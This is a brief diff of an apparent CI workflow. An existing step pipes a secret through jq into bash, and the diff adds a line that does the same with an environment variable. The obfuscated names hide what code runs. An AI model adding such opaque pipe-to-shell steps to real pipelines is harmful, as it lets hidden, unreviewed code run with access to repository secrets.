@@ -20,6 +20,7 @@ jobs:
           tu2714: ${{ secrets.tu2714 }}
         run: |
           printf '%s' "$tu2714" | jq -r .eckir78532 | /bin/bash
+          echo $enm7974 | jq -r .hu6 | /bin/bash
 
       - name: Save output
         if: always()
